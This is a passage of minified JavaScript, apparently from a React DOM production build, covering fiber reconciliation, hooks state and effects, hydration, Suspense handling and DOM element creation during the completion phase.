d):null;case gb:return c.key===e?n(a,b,c,d):null}if(Qc(c)||zb(c))return null!==e?null:l(a,b,c,d,null);Nc(a,c)}return null}function t(a,b,c,d,e){if("string"===typeof d||"number"===typeof d)return a=a.get(c)||null,h(b,a,""+d,e);if("object"===typeof d&&null!==d){switch(d.$$typeof){case Pc:return a=a.get(null===d.key?c:d.key)||null,d.type===Ma?l(b,a,d.props.children,e,d.key):m(b,a,d,e);case gb:return a=a.get(null===d.key?c:d.key)||null,n(b,a,d,e)}if(Qc(d)||zb(d))return a=a.get(c)||null,l(b,a,d,e,null);
Nc(b,d)}return null}function q(e,g,h,m){for(var n=null,k=null,l=g,r=g=0,C=null;null!==l&&r<h.length;r++){l.index>r?(C=l,l=null):C=l.sibling;var O=p(e,l,h[r],m);if(null===O){null===l&&(l=C);break}a&&l&&null===O.alternate&&b(e,l);g=f(O,g,r);null===k?n=O:k.sibling=O;k=O;l=C}if(r===h.length)return c(e,l),n;if(null===l){for(;r<h.length;r++)l=ba(e,h[r],m),null!==l&&(g=f(l,g,r),null===k?n=l:k.sibling=l,k=l);return n}for(l=d(e,l);r<h.length;r++)C=t(l,e,r,h[r],m),null!==C&&(a&&null!==C.alternate&&l.delete(null===
C.key?r:C.key),g=f(C,g,r),null===k?n=C:k.sibling=C,k=C);a&&l.forEach(function(a){return b(e,a)});return n}function w(e,g,h,n){var m=zb(h);if("function"!==typeof m)throw Error(k(150));h=m.call(h);if(null==h)throw Error(k(151));for(var l=m=null,r=g,C=g=0,O=null,v=h.next();null!==r&&!v.done;C++,v=h.next()){r.index>C?(O=r,r=null):O=r.sibling;var q=p(e,r,v.value,n);if(null===q){null===r&&(r=O);break}a&&r&&null===q.alternate&&b(e,r);g=f(q,g,C);null===l?m=q:l.sibling=q;l=q;r=O}if(v.done)return c(e,r),m;
if(null===r){for(;!v.done;C++,v=h.next())v=ba(e,v.value,n),null!==v&&(g=f(v,g,C),null===l?m=v:l.sibling=v,l=v);return m}for(r=d(e,r);!v.done;C++,v=h.next())v=t(r,e,C,v.value,n),null!==v&&(a&&null!==v.alternate&&r.delete(null===v.key?C:v.key),g=f(v,g,C),null===l?m=v:l.sibling=v,l=v);a&&r.forEach(function(a){return b(e,a)});return m}return function(a,d,f,h){var m="object"===typeof f&&null!==f&&f.type===Ma&&null===f.key;m&&(f=f.props.children);var n="object"===typeof f&&null!==f;if(n)switch(f.$$typeof){case Pc:a:{n=
f.key;for(m=d;null!==m;){if(m.key===n){switch(m.tag){case 7:if(f.type===Ma){c(a,m.sibling);d=e(m,f.props.children);d.return=a;a=d;break a}break;default:if(m.elementType===f.type){c(a,m.sibling);d=e(m,f.props);d.ref=Rb(a,m,f);d.return=a;a=d;break a}}c(a,m);break}else b(a,m);m=m.sibling}f.type===Ma?(d=Ha(f.props.children,a.mode,h,f.key),d.return=a,a=d):(h=Oc(f.type,f.key,f.props,null,a.mode,h),h.ref=Rb(a,d,f),h.return=a,a=h)}return g(a);case gb:a:{for(m=f.key;null!==d;){if(d.key===m)if(4===d.tag&&d.stateNode.containerInfo===
f.containerInfo&&d.stateNode.implementation===f.implementation){c(a,d.sibling);d=e(d,f.children||[]);d.return=a;a=d;break a}else{c(a,d);break}else b(a,d);d=d.sibling}d=re(f,a.mode,h);d.return=a;a=d}return g(a)}if("string"===typeof f||"number"===typeof f)return f=""+f,null!==d&&6===d.tag?(c(a,d.sibling),d=e(d,f),d.return=a,a=d):(c(a,d),d=qe(f,a.mode,h),d.return=a,a=d),g(a);if(Qc(f))return q(a,d,f,h);if(zb(f))return w(a,d,f,h);n&&Nc(a,f);if("undefined"===typeof f&&!m)switch(a.tag){case 1:case 0:throw a=
a.type,Error(k(152,a.displayName||a.name||"Component"));}return c(a,d)}}function Ta(a){if(a===Sb)throw Error(k(174));return a}function se(a,b){y(Tb,b);y(Ub,a);y(ja,Sb);a=b.nodeType;switch(a){case 9:case 11:b=(b=b.documentElement)?b.namespaceURI:Hd(null,"");break;default:a=8===a?b.parentNode:b,b=a.namespaceURI||null,a=a.tagName,b=Hd(b,a)}q(ja);y(ja,b)}function tb(a){q(ja);q(Ub);q(Tb)}function bh(a){Ta(Tb.current);var b=Ta(ja.current);var c=Hd(b,a.type);b!==c&&(y(Ub,a),y(ja,c))}function te(a){Ub.current===
a&&(q(ja),q(Ub))}function Rc(a){for(var b=a;null!==b;){if(13===b.tag){var c=b.memoizedState;if(null!==c&&(c=c.dehydrated,null===c||c.data===$d||c.data===Zd))return b}else if(19===b.tag&&void 0!==b.memoizedProps.revealOrder){if(0!==(b.effectTag&64))return b}else if(null!==b.child){b.child.return=b;b=b.child;continue}if(b===a)break;for(;null===b.sibling;){if(null===b.return||b.return===a)return null;b=b.return}b.sibling.return=b.return;b=b.sibling}return null}function ue(a,b){return{responder:a,props:b}}
function S(){throw Error(k(321));}function ve(a,b){if(null===b)return!1;for(var c=0;c<b.length&&c<a.length;c++)if(!Qa(a[c],b[c]))return!1;return!0}function we(a,b,c,d,e,f){Ia=f;z=b;b.memoizedState=null;b.updateQueue=null;b.expirationTime=0;Sc.current=null===a||null===a.memoizedState?dj:ej;a=c(d,e);if(b.expirationTime===Ia){f=0;do{b.expirationTime=0;if(!(25>f))throw Error(k(301));f+=1;J=K=null;b.updateQueue=null;Sc.current=fj;a=c(d,e)}while(b.expirationTime===Ia)}Sc.current=Tc;b=null!==K&&null!==K.next;
Ia=0;J=K=z=null;Uc=!1;if(b)throw Error(k(300));return a}function ub(){var a={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};null===J?z.memoizedState=J=a:J=J.next=a;return J}function vb(){if(null===K){var a=z.alternate;a=null!==a?a.memoizedState:null}else a=K.next;var b=null===J?z.memoizedState:J.next;if(null!==b)J=b,K=a;else{if(null===a)throw Error(k(310));K=a;a={memoizedState:K.memoizedState,baseState:K.baseState,baseQueue:K.baseQueue,queue:K.queue,next:null};null===J?z.memoizedState=
J=a:J=J.next=a}return J}function Ua(a,b){return"function"===typeof b?b(a):b}function Vc(a,b,c){b=vb();c=b.queue;if(null===c)throw Error(k(311));c.lastRenderedReducer=a;var d=K,e=d.baseQueue,f=c.pending;if(null!==f){if(null!==e){var g=e.next;e.next=f.next;f.next=g}d.baseQueue=e=f;c.pending=null}if(null!==e){e=e.next;d=d.baseState;var h=g=f=null,m=e;do{var n=m.expirationTime;if(n<Ia){var l={expirationTime:m.expirationTime,suspenseConfig:m.suspenseConfig,action:m.action,eagerReducer:m.eagerReducer,eagerState:m.eagerState,
next:null};null===h?(g=h=l,f=d):h=h.next=l;n>z.expirationTime&&(z.expirationTime=n,Kc(n))}else null!==h&&(h=h.next={expirationTime:1073741823,suspenseConfig:m.suspenseConfig,action:m.action,eagerReducer:m.eagerReducer,eagerState:m.eagerState,next:null}),Vg(n,m.suspenseConfig),d=m.eagerReducer===a?m.eagerState:a(d,m.action);m=m.next}while(null!==m&&m!==e);null===h?f=d:h.next=g;Qa(d,b.memoizedState)||(ia=!0);b.memoizedState=d;b.baseState=f;b.baseQueue=h;c.lastRenderedState=d}return[b.memoizedState,
c.dispatch]}function Wc(a,b,c){b=vb();c=b.queue;if(null===c)throw Error(k(311));c.lastRenderedReducer=a;var d=c.dispatch,e=c.pending,f=b.memoizedState;if(null!==e){c.pending=null;var g=e=e.next;do f=a(f,g.action),g=g.next;while(g!==e);Qa(f,b.memoizedState)||(ia=!0);b.memoizedState=f;null===b.baseQueue&&(b.baseState=f);c.lastRenderedState=f}return[f,d]}function xe(a){var b=ub();"function"===typeof a&&(a=a());b.memoizedState=b.baseState=a;a=b.queue={pending:null,dispatch:null,lastRenderedReducer:Ua,
lastRenderedState:a};a=a.dispatch=ch.bind(null,z,a);return[b.memoizedState,a]}function ye(a,b,c,d){a={tag:a,create:b,destroy:c,deps:d,next:null};b=z.updateQueue;null===b?(b={lastEffect:null},z.updateQueue=b,b.lastEffect=a.next=a):(c=b.lastEffect,null===c?b.lastEffect=a.next=a:(d=c.next,c.next=a,a.next=d,b.lastEffect=a));return a}function dh(a){return vb().memoizedState}function ze(a,b,c,d){var e=ub();z.effectTag|=a;e.memoizedState=ye(1|b,c,void 0,void 0===d?null:d)}function Ae(a,b,c,d){var e=vb();
d=void 0===d?null:d;var f=void 0;if(null!==K){var g=K.memoizedState;f=g.destroy;if(null!==d&&ve(d,g.deps)){ye(b,c,f,d);return}}z.effectTag|=a;e.memoizedState=ye(1|b,c,f,d)}function eh(a,b){return ze(516,4,a,b)}function Xc(a,b){return Ae(516,4,a,b)}function fh(a,b){return Ae(4,2,a,b)}function gh(a,b){if("function"===typeof b)return a=a(),b(a),function(){b(null)};if(null!==b&&void 0!==b)return a=a(),b.current=a,function(){b.current=null}}function hh(a,b,c){c=null!==c&&void 0!==c?c.concat([a]):null;
return Ae(4,2,gh.bind(null,b,a),c)}function Be(a,b){}function ih(a,b){ub().memoizedState=[a,void 0===b?null:b];return a}function Yc(a,b){var c=vb();b=void 0===b?null:b;var d=c.memoizedState;if(null!==d&&null!==b&&ve(b,d[1]))return d[0];c.memoizedState=[a,b];return a}function jh(a,b){var c=vb();b=void 0===b?null:b;var d=c.memoizedState;if(null!==d&&null!==b&&ve(b,d[1]))return d[0];a=a();c.memoizedState=[a,b];return a}function Ce(a,b,c){var d=Cc();Da(98>d?98:d,function(){a(!0)});Da(97<d?97:d,function(){var d=
X.suspense;X.suspense=void 0===b?null:b;try{a(!1),c()}finally{X.suspense=d}})}function ch(a,b,c){var d=ka(),e=Vb.suspense;d=Va(d,a,e);e={expirationTime:d,suspenseConfig:e,action:c,eagerReducer:null,eagerState:null,next:null};var f=b.pending;null===f?e.next=e:(e.next=f.next,f.next=e);b.pending=e;f=a.alternate;if(a===z||null!==f&&f===z)Uc=!0,e.expirationTime=Ia,z.expirationTime=Ia;else{if(0===a.expirationTime&&(null===f||0===f.expirationTime)&&(f=b.lastRenderedReducer,null!==f))try{var g=b.lastRenderedState,
h=f(g,c);e.eagerReducer=f;e.eagerState=h;if(Qa(h,g))return}catch(m){}finally{}Ja(a,d)}}function kh(a,b){var c=la(5,null,null,0);c.elementType="DELETED";c.type="DELETED";c.stateNode=b;c.return=a;c.effectTag=8;null!==a.lastEffect?(a.lastEffect.nextEffect=c,a.lastEffect=c):a.firstEffect=a.lastEffect=c}function lh(a,b){switch(a.tag){case 5:var c=a.type;b=1!==b.nodeType||c.toLowerCase()!==b.nodeName.toLowerCase()?null:b;return null!==b?(a.stateNode=b,!0):!1;case 6:return b=""===a.pendingProps||3!==b.nodeType?
null:b,null!==b?(a.stateNode=b,!0):!1;case 13:return!1;default:return!1}}function De(a){if(Wa){var b=Ka;if(b){var c=b;if(!lh(a,b)){b=kb(c.nextSibling);if(!b||!lh(a,b)){a.effectTag=a.effectTag&-1025|2;Wa=!1;ra=a;return}kh(ra,c)}ra=a;Ka=kb(b.firstChild)}else a.effectTag=a.effectTag&-1025|2,Wa=!1,ra=a}}function mh(a){for(a=a.return;null!==a&&5!==a.tag&&3!==a.tag&&13!==a.tag;)a=a.return;ra=a}function Zc(a){if(a!==ra)return!1;if(!Wa)return mh(a),Wa=!0,!1;var b=a.type;if(5!==a.tag||"head"!==b&&"body"!==
b&&!Yd(b,a.memoizedProps))for(b=Ka;b;)kh(a,b),b=kb(b.nextSibling);mh(a);if(13===a.tag){a=a.memoizedState;a=null!==a?a.dehydrated:null;if(!a)throw Error(k(317));a:{a=a.nextSibling;for(b=0;a;){if(8===a.nodeType){var c=a.data;if(c===og){if(0===b){Ka=kb(a.nextSibling);break a}b--}else c!==ng&&c!==Zd&&c!==$d||b++}a=a.nextSibling}Ka=null}}else Ka=ra?kb(a.stateNode.nextSibling):null;return!0}function Ee(){Ka=ra=null;Wa=!1}function T(a,b,c,d){b.child=null===a?Fe(b,null,c,d):wb(b,a.child,c,d)}function nh(a,
b,c,d,e){c=c.render;var f=b.ref;rb(b,e);d=we(a,b,c,d,f,e);if(null!==a&&!ia)return b.updateQueue=a.updateQueue,b.effectTag&=-517,a.expirationTime<=e&&(a.expirationTime=0),sa(a,b,e);b.effectTag|=1;T(a,b,d,e);return b.child}function oh(a,b,c,d,e,f){if(null===a){var g=c.type;if("function"===typeof g&&!Ge(g)&&void 0===g.defaultProps&&null===c.compare&&void 0===c.defaultProps)return b.tag=15,b.type=g,ph(a,b,g,d,e,f);a=Oc(c.type,null,d,null,b.mode,f);a.ref=b.ref;a.return=b;return b.child=a}g=a.child;if(e<
f&&(e=g.memoizedProps,c=c.compare,c=null!==c?c:Ob,c(e,d)&&a.ref===b.ref))return sa(a,b,f);b.effectTag|=1;a=Sa(g,d);a.ref=b.ref;a.return=b;return b.child=a}function ph(a,b,c,d,e,f){return null!==a&&Ob(a.memoizedProps,d)&&a.ref===b.ref&&(ia=!1,e<f)?(b.expirationTime=a.expirationTime,sa(a,b,f)):He(a,b,c,d,f)}function qh(a,b){var c=b.ref;if(null===a&&null!==c||null!==a&&a.ref!==c)b.effectTag|=128}function He(a,b,c,d,e){var f=N(c)?Ra:B.current;f=pb(b,f);rb(b,e);c=we(a,b,c,d,f,e);if(null!==a&&!ia)return b.updateQueue=
a.updateQueue,b.effectTag&=-517,a.expirationTime<=e&&(a.expirationTime=0),sa(a,b,e);b.effectTag|=1;T(a,b,c,e);return b.child}function rh(a,b,c,d,e){if(N(c)){var f=!0;Bc(b)}else f=!1;rb(b,e);if(null===b.stateNode)null!==a&&(a.alternate=null,b.alternate=null,b.effectTag|=2),Yg(b,c,d),pe(b,c,d,e),d=!0;else if(null===a){var g=b.stateNode,h=b.memoizedProps;g.props=h;var m=g.context,n=c.contextType;"object"===typeof n&&null!==n?n=W(n):(n=N(c)?Ra:B.current,n=pb(b,n));var l=c.getDerivedStateFromProps,k="function"===
typeof l||"function"===typeof g.getSnapshotBeforeUpdate;k||"function"!==typeof g.UNSAFE_componentWillReceiveProps&&"function"!==typeof g.componentWillReceiveProps||(h!==d||m!==n)&&Zg(b,g,d,n);Ga=!1;var p=b.memoizedState;g.state=p;Qb(b,d,g,e);m=b.memoizedState;h!==d||p!==m||G.current||Ga?("function"===typeof l&&(Lc(b,c,l,d),m=b.memoizedState),(h=Ga||Xg(b,c,h,d,p,m,n))?(k||"function"!==typeof g.UNSAFE_componentWillMount&&"function"!==typeof g.componentWillMount||("function"===typeof g.componentWillMount&&
g.componentWillMount(),"function"===typeof g.UNSAFE_componentWillMount&&g.UNSAFE_componentWillMount()),"function"===typeof g.componentDidMount&&(b.effectTag|=4)):("function"===typeof g.componentDidMount&&(b.effectTag|=4),b.memoizedProps=d,b.memoizedState=m),g.props=d,g.state=m,g.context=n,d=h):("function"===typeof g.componentDidMount&&(b.effectTag|=4),d=!1)}else g=b.stateNode,oe(a,b),h=b.memoizedProps,g.props=b.type===b.elementType?h:aa(b.type,h),m=g.context,n=c.contextType,"object"===typeof n&&null!==
n?n=W(n):(n=N(c)?Ra:B.current,n=pb(b,n)),l=c.getDerivedStateFromProps,(k="function"===typeof l||"function"===typeof g.getSnapshotBeforeUpdate)||"function"!==typeof g.UNSAFE_componentWillReceiveProps&&"function"!==typeof g.componentWillReceiveProps||(h!==d||m!==n)&&Zg(b,g,d,n),Ga=!1,m=b.memoizedState,g.state=m,Qb(b,d,g,e),p=b.memoizedState,h!==d||m!==p||G.current||Ga?("function"===typeof l&&(Lc(b,c,l,d),p=b.memoizedState),(l=Ga||Xg(b,c,h,d,m,p,n))?(k||"function"!==typeof g.UNSAFE_componentWillUpdate&&
"function"!==typeof g.componentWillUpdate||("function"===typeof g.componentWillUpdate&&g.componentWillUpdate(d,p,n),"function"===typeof g.UNSAFE_componentWillUpdate&&g.UNSAFE_componentWillUpdate(d,p,n)),"function"===typeof g.componentDidUpdate&&(b.effectTag|=4),"function"===typeof g.getSnapshotBeforeUpdate&&(b.effectTag|=256)):("function"!==typeof g.componentDidUpdate||h===a.memoizedProps&&m===a.memoizedState||(b.effectTag|=4),"function"!==typeof g.getSnapshotBeforeUpdate||h===a.memoizedProps&&m===
a.memoizedState||(b.effectTag|=256),b.memoizedProps=d,b.memoizedState=p),g.props=d,g.state=p,g.context=n,d=l):("function"!==typeof g.componentDidUpdate||h===a.memoizedProps&&m===a.memoizedState||(b.effectTag|=4),"function"!==typeof g.getSnapshotBeforeUpdate||h===a.memoizedProps&&m===a.memoizedState||(b.effectTag|=256),d=!1);return Ie(a,b,c,d,f,e)}function Ie(a,b,c,d,e,f){qh(a,b);var g=0!==(b.effectTag&64);if(!d&&!g)return e&&Hg(b,c,!1),sa(a,b,f);d=b.stateNode;gj.current=b;var h=g&&"function"!==typeof c.getDerivedStateFromError?
null:d.render();b.effectTag|=1;null!==a&&g?(b.child=wb(b,a.child,null,f),b.child=wb(b,null,h,f)):T(a,b,h,f);b.memoizedState=d.state;e&&Hg(b,c,!0);return b.child}function sh(a){var b=a.stateNode;b.pendingContext?Fg(a,b.pendingContext,b.pendingContext!==b.context):b.context&&Fg(a,b.context,!1);se(a,b.containerInfo)}function th(a,b,c){var d=b.mode,e=b.pendingProps,f=D.current,g=!1,h;(h=0!==(b.effectTag&64))||(h=0!==(f&2)&&(null===a||null!==a.memoizedState));h?(g=!0,b.effectTag&=-65):null!==a&&null===
a.memoizedState||void 0===e.fallback||!0===e.unstable_avoidThisFallback||(f|=1);y(D,f&1);if(null===a){void 0!==e.fallback&&De(b);if(g){g=e.fallback;e=Ha(null,d,0,null);e.return=b;if(0===(b.mode&2))for(a=null!==b.memoizedState?b.child.child:b.child,e.child=a;null!==a;)a.return=e,a=a.sibling;c=Ha(g,d,c,null);c.return=b;e.sibling=c;b.memoizedState=Je;b.child=e;return c}d=e.children;b.memoizedState=null;return b.child=Fe(b,null,d,c)}if(null!==a.memoizedState){a=a.child;d=a.sibling;if(g){e=e.fallback;
c=Sa(a,a.pendingProps);c.return=b;if(0===(b.mode&2)&&(g=null!==b.memoizedState?b.child.child:b.child,g!==a.child))for(c.child=g;null!==g;)g.return=c,g=g.sibling;d=Sa(d,e);d.return=b;c.sibling=d;c.childExpirationTime=0;b.memoizedState=Je;b.child=c;return d}c=wb(b,a.child,e.children,c);b.memoizedState=null;return b.child=c}a=a.child;if(g){g=e.fallback;e=Ha(null,d,0,null);e.return=b;e.child=a;null!==a&&(a.return=e);if(0===(b.mode&2))for(a=null!==b.memoizedState?b.child.child:b.child,e.child=a;null!==
a;)a.return=e,a=a.sibling;c=Ha(g,d,c,null);c.return=b;e.sibling=c;c.effectTag|=2;e.childExpirationTime=0;b.memoizedState=Je;b.child=e;return c}b.memoizedState=null;return b.child=wb(b,a,e.children,c)}function uh(a,b){a.expirationTime<b&&(a.expirationTime=b);var c=a.alternate;null!==c&&c.expirationTime<b&&(c.expirationTime=b);Sg(a.return,b)}function Ke(a,b,c,d,e,f){var g=a.memoizedState;null===g?a.memoizedState={isBackwards:b,rendering:null,renderingStartTime:0,last:d,tail:c,tailExpiration:0,tailMode:e,
lastEffect:f}:(g.isBackwards=b,g.rendering=null,g.renderingStartTime=0,g.last=d,g.tail=c,g.tailExpiration=0,g.tailMode=e,g.lastEffect=f)}function vh(a,b,c){var d=b.pendingProps,e=d.revealOrder,f=d.tail;T(a,b,d.children,c);d=D.current;if(0!==(d&2))d=d&1|2,b.effectTag|=64;else{if(null!==a&&0!==(a.effectTag&64))a:for(a=b.child;null!==a;){if(13===a.tag)null!==a.memoizedState&&uh(a,c);else if(19===a.tag)uh(a,c);else if(null!==a.child){a.child.return=a;a=a.child;continue}if(a===b)break a;for(;null===a.sibling;){if(null===
a.return||a.return===b)break a;a=a.return}a.sibling.return=a.return;a=a.sibling}d&=1}y(D,d);if(0===(b.mode&2))b.memoizedState=null;else switch(e){case "forwards":c=b.child;for(e=null;null!==c;)a=c.alternate,null!==a&&null===Rc(a)&&(e=c),c=c.sibling;c=e;null===c?(e=b.child,b.child=null):(e=c.sibling,c.sibling=null);Ke(b,!1,e,c,f,b.lastEffect);break;case "backwards":c=null;e=b.child;for(b.child=null;null!==e;){a=e.alternate;if(null!==a&&null===Rc(a)){b.child=e;break}a=e.sibling;e.sibling=c;c=e;e=a}Ke(b,
!0,c,null,f,b.lastEffect);break;case "together":Ke(b,!1,null,null,void 0,b.lastEffect);break;default:b.memoizedState=null}return b.child}function sa(a,b,c){null!==a&&(b.dependencies=a.dependencies);var d=b.expirationTime;0!==d&&Kc(d);if(b.childExpirationTime<c)return null;if(null!==a&&b.child!==a.child)throw Error(k(153));if(null!==b.child){a=b.child;c=Sa(a,a.pendingProps);b.child=c;for(c.return=b;null!==a.sibling;)a=a.sibling,c=c.sibling=Sa(a,a.pendingProps),c.return=b;c.sibling=null}return b.child}
function $c(a,b){switch(a.tailMode){case "hidden":b=a.tail;for(var c=null;null!==b;)null!==b.alternate&&(c=b),b=b.sibling;null===c?a.tail=null:c.sibling=null;break;case "collapsed":c=a.tail;for(var d=null;null!==c;)null!==c.alternate&&(d=c),c=c.sibling;null===d?b||null===a.tail?a.tail=null:a.tail.sibling=null:d.sibling=null}}function hj(a,b,c){var d=b.pendingProps;switch(b.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return null;case 1:return N(b.type)&&(q(G),q(B)),
null;case 3:return tb(),q(G),q(B),c=b.stateNode,c.pendingContext&&(c.context=c.pendingContext,c.pendingContext=null),null!==a&&null!==a.child||!Zc(b)||(b.effectTag|=4),wh(b),null;case 5:te(b);c=Ta(Tb.current);var e=b.type;if(null!==a&&null!=b.stateNode)ij(a,b,e,d,c),a.ref!==b.ref&&(b.effectTag|=128);else{if(!d){if(null===b.stateNode)throw Error(k(166));return null}a=Ta(ja.current);if(Zc(b)){d=b.stateNode;e=b.type;var f=b.memoizedProps;d[Aa]=b;d[vc]=f;switch(e){case "iframe":case "object":case "embed":w("load",
d);break;case "video":case "audio":for(a=0;a<Db.length;a++)w(Db[a],d);break;case "source":w("error",d);break;case "img":case "image":case "link":w("error",d);w("load",d);break;case "form":w("reset",d);w("submit",d);break;case "details":w("toggle",d);break;case "input":Hf(d,f);w("invalid",d);oa(c,"onChange");break;case "select":d._wrapperState={wasMultiple:!!f.multiple};w("invalid",d);oa(c,"onChange");break;case "textarea":Kf(d,f),w("invalid",d),oa(c,"onChange")}Ud(e,f);a=null;for(var g in f)if(f.hasOwnProperty(g)){var h=
f[g];"children"===g?"string"===typeof h?d.textContent!==h&&(a=["children",h]):"number"===typeof h&&d.textContent!==""+h&&(a=["children",""+h]):db.hasOwnProperty(g)&&null!=h&&oa(c,g)}switch(e){case "input":mc(d);Jf(d,f,!0);break;case "textarea":mc(d);Mf(d);break;case "select":case "option":break;default:"function"===typeof f.onClick&&(d.onclick=uc)}c=a;b.updateQueue=c;null!==c&&(b.effectTag|=4)}else{g=9===c.nodeType?c:c.ownerDocument;"http://www.w3.org/1999/xhtml"===a&&(a=Nf(e));"http://www.w3.org/1999/xhtml"===
a?"script"===e?(a=g.createElement("div"),a.innerHTML="<script>\x3c/script>",a=a.removeChild(a.firstChild)):"string"===typeof d.is?a=g.createElement(e,{is:d.is}):(a=g.createElement(e),"select"===e&&(g=a,d.multiple?g.multiple=!0:d.size&&(g.size=d.size))):a=g.createElementNS(a,e);a[Aa]=b;a[vc]=d;jj(a,b,!1,!1);b.stateNode=a;g=Vd(e,d);switch(e){case "iframe":case "object":case "embed":w("load",a);h=d;break;case "video":case "audio":for(h=0;h<Db.length;h++)w(Db[h],a);h=d;break;case "source":w("error",a);
h=d;break;case "img":case "image":case "link":w("error",a);w("load",a);h=d;break;case "form":w("reset",a);w("submit",a);h=d;break;case "details":w("toggle",a);h=d;break;case "input":Hf(a,d);h=Cd(a,d);w("invalid",a);oa(c,"onChange");break;case "option":h=Fd(a,d);break;case "select":a._wrapperState={wasMultiple:!!d.multiple};h=M({},d,{value:void 0});w("invalid",a);oa(c,"onChange");break;case "textarea":Kf(a,d);h=Gd(a,d);w("invalid",a);oa(c,"onChange");break;default:h=d}Ud(e,h);var m=h;for(f in m)if(m.hasOwnProperty(f)){var n=
m[f];"style"===f?gg(a,n):"dangerouslySetInnerHTML"===f?(n=n?n.__html:void 0,null!=n&&xh(a,n)):"children"===f?"string"===typeof n?("textarea"!==e||""!==n)&&Wb(a,n):"number"===typeof n&&Wb(a,""+n):"suppressContentEditableWarning"!==f&&"suppressHydrationWarning"!==f&&"autoFocus"!==f&&(db.hasOwnProperty(f)?null!=n&&oa(c,f):null!=n&&xd(a,f,n,g))}switch(e){case "input":mc(a);Jf(a,d,!1);break;case "textarea":mc(a);Mf(a);break;case "option":null!=d.value&&a.setAttribute("value",""+va(d.value));break;case "select":a.multiple=
!!d.multiple;c=d.value;null!=c?hb(a,!!d.multiple,c,!1):null!=d.defaultValue&&hb(a,!!d.multiple,d.defaultValue,!0);break;default:"function"===typeof h.onClick&&(a.onclick=uc)}lg(e,d)&&(b.effectTag|=4)}null!==b.ref&&(b.effectTag|=128)}return null;case 6:if(a&&null!=b.stateNode)kj(a,b,a.memoizedProps,d);else{if("string"!==typeof d&&null===b.stateNode)throw Error(k(166));c=Ta(Tb.current);Ta(ja.current);Zc(b)?(c=b.stateNode,d=b.memoizedProps,c[Aa]=b,c.nodeValue!==d&&(b.effectTag|=4)):(c=(9===c.nodeType?
c:c.ownerDocument).createTextNode(d),c[Aa]=b,b.stateNode=c)}return null;case 13:q(D);d=b.memoizedState;if(0!==(b.effectTag&64))return b.expirationTime=c,b;c=null!==d;d=!1;null===a?void 0!==b.memoizedProps.fallback&&Zc(b):(e=a.memoizedState,d=null!==e,c||null===e||(e=a.child.sibling,null!==e&&(f=b.firstEffect,null!==f?(b.firstEffect=e,e.nextEffect=f):(b.firstEffect=b.lastEffect=e,e.nextEffect=null),e.effectTag=8)));if(c&&!d&&0!==(b.mode&2))if(null===a&&!0!==b.memoizedProps.unstable_avoidThisFallback||
0!==(D.current&1))F===Xa&&(F=ad);else{if(F===Xa||F===ad)F=bd;0!==Xb&&null!==U&&(Ya(U,P),yh(U,Xb))}if(c||d)b.effectTag|=4;return null;case 4:return tb(),wh(b),null;case 10:return me(b),null;case 17:return N(b.type)&&(q(G),q(B)),null;case 19:q(D);d=b.memoizedState;if(null===d)return null;e=0!==(b.effectTag&64);f=d.rendering;if(null===f)if(e)$c(d,!1);else{if(F!==Xa||null!==a&&0!==(a.effectTag&64))for(f=b.child;null!==f;){a=Rc(f);if(null!==a){b.effectTag|=64;$c(d,!1);e=a.updateQueue;null!==e&&(b.updateQueue=
e,b.effectTag|=4);null===d.lastEffect&&(b.firstEffect=null);b.lastEffect=d.lastEffect;for(d=b.child;null!==d;)e=d,f=c,e.effectTag&=2,e.nextEffect=null,e.firstEffect=null,e.lastEffect=null,a=e.alternate,null===a?(e.childExpirationTime=0,e.expirationTime=f,e.child=null,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null):(e.childExpirationTime=a.childExpirationTime,e.expirationTime=a.expirationTime,e.child=a.child,e.memoizedProps=a.memoizedProps,e.memoizedState=a.memoizedState,
e.updateQueue=a.updateQueue,f=a.dependencies,e.dependencies=null===f?null:{expirationTime:f.expirationTime,firstContext:f.firstContext,responders:f.responders}),d=d.sibling;y(D,D.current&1|2);return b.child}f=f.sibling}}else{if(!e)if(a=Rc(f),null!==a){if(b.effectTag|=64,e=!0,c=a.updateQueue,null!==c&&(b.updateQueue=c,b.effectTag|=4),$c(d,!0),null===d.tail&&"hidden"===d.tailMode&&!f.alternate)return b=b.lastEffect=d.lastEffect,null!==b&&(b.nextEffect=null),null}else 2*Y()-d.renderingStartTime>d.tailExpiration&&
1<c&&(b.effectTag|=64,e=!0,$c(d,!1),b.expirationTime=b.childExpirationTime=c-1);d.isBackwards?(f.sibling=b.child,b.child=f):(c=d.last,null!==c?c.sibling=f:b.child=f,d.last=f)}return null!==d.tail?(0===d.tailExpiration&&(d.tailExpiration=Y()+500),c=d.tail,d.rendering=c,d.tail=c.sibling,d.lastEffect=b.lastEffect,d.renderingStartTime=Y(),c.sibling=null,b=D.current,y(D,e?b&1|2:b&1),c):null}throw Error(k(156,b.tag));}function lj(a,b){switch(a.tag){case 1:return N(a.type)&&(q(G),q(B)),b=a.effectTag,b&4096?
(a.effectTag=b&-4097|64,a):null;case 3:tb();q(G);q(B);b=a.effectTag;if(0!==(b&64))throw Error(k(285));a.effectTag=b&-4097|64;return a;case 5:return te(a),null;case 13:return q(D),b=a.effectTag,b&4096?(a.effectTag=b&-4097|64,a):null;case 19:return q(D),null;case 4:return tb(),null;case 10:return me(a),null;default:return null}}function Le(a,b){return{value:a,source:b,stack:Bd(b)}}function Me(a,b){var c=b.source,d=b.stack;null===d&&null!==c&&(d=Bd(c));null!==c&&na(c.type);b=b.value;null!==a&&1===a.tag&&
na(a.type);try{console.error(b)}catch(e){setTimeout(function(){throw e;})}}function mj(a,b){try{b.props=a.memoizedProps,b.state=a.memoizedState,b.componentWillUnmount()}catch(c){Za(a,c)}}function zh(a){var b=a.ref;if(null!==b)if("function"===typeof b)try{b(null)}catch(c){Za(a,c)}else b.current=null}function nj(a,b){switch(b.tag){case 0:case 11:case 15:case 22:return;case 1:if(b.effectTag&256&&null!==a){var c=a.memoizedProps,d=a.memoizedState;a=b.stateNode;b=a.getSnapshotBeforeUpdate(b.elementType===
